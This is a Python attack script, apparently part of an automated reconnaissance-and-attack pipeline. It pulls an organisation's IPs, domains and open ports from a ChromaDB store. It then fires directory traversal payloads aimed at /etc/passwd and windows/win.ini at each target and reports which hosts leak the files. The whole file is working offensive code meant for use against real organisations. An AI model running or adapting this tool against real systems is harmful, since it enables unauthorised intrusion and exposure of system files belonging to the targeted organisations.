import chromadb
import os
import sys
import requests

# Function to display ASCII art
def cuddles_art():
    art = """
██   ██ ████████ ████████ ██████      ████████ ██████   █████  ██    ██ ███████ ██████  ███████  █████  ██      
██   ██    ██       ██    ██   ██        ██    ██   ██ ██   ██ ██    ██ ██      ██   ██ ██      ██   ██ ██      
███████    ██       ██    ██████         ██    ██████  ███████ ██    ██ █████   ██████  ███████ ███████ ██      
██   ██    ██       ██    ██             ██    ██   ██ ██   ██  ██  ██  ██      ██   ██      ██ ██   ██ ██      
██   ██    ██       ██    ██             ██    ██   ██ ██   ██   ████   ███████ ██   ██ ███████ ██   ██ ███████ 
                                                                                                                
                                                                                                                                                                                                 
"""
    return art

# Function to connect to ChromaDB and retrieve collection data
def get_chromadb_data(collection_name):
    chromadb_client = chromadb.PersistentClient(path="./data")
    collection = chromadb_client.get_or_create_collection(name=collection_name.lower().replace(' ', '_'))
    # Fetching all documents from the collection
    documents = collection.get(ids=None)
    return collection, documents['documents']

# Function to attempt directory traversal attack
def attempt_directory_traversal(ip):
    traversal_payloads = [
        "../../../../etc/passwd",
        "../../../../../windows/win.ini"
    ]
    for payload in traversal_payloads:
        try:
            url = f"http://{ip}/{payload}"
            response = requests.get(url)
            if response.status_code == 200 and ("root:" in response.text or "extensions" in response.text):
                print(f"Success: Directory traversal vulnerability found at {url}")
                return True
        except Exception as e:
            print(f"Error accessing {url}: {str(e)}")
    return False

def main():
    print(cuddles_art())
    print("Starting the process to check for directory traversal vulnerabilities.")

    # Retrieve organisation name from command-line arguments
    if len(sys.argv) != 2:
        print("Usage: python3 http_traversal.py <organisation_name>")
        return
    org_name = sys.argv[1]

    # Stage One: Connect to ChromaDB and retrieve data
    collection, documents = get_chromadb_data(org_name)
    if not documents:
        print(f"No data found for organisation '{org_name}'. Exiting.")
        return

    # Debugging: Print fetched documents to check their structure
    print("Fetched documents:", documents)

    # Extract IP addresses and open ports from documents
    ips_and_domains = []
    open_ports = []
    for doc in documents:
        print("Document text:", doc)  # Debugging: Print each document text
        if 'Known domains and IPs' in doc:
            ips_and_domains_str = doc.split('Known domains and IPs: ')[-1]
            ips_and_domains.extend(ips_and_domains_str.split(','))
        if 'PORT' in doc:
            for line in doc.split('\n'):
                if '/tcp' in line and 'open' in line:
                    port = line.split('/')[0].strip()
                    open_ports.append(int(port))

    if not ips_and_domains:
        print(f"No IP addresses or domains found for organisation '{org_name}'. Exiting.")
        return

    # Check for open HTTP ports and attempt directory traversal
    http_ports = [80, 443]
    if any(port in open_ports for port in http_ports):
        for ip in ips_and_domains:
            print(f"Attempting directory traversal on {ip}...")
            if attempt_directory_traversal(ip):
                print(f"Successfully found directory traversal vulnerability on {ip}.")
                return
        print("Failed to find directory traversal vulnerability on any IPs.")
    else:
        print("No open HTTP ports found on any provided IPs.")

if __name__ == "__main__":
    main()
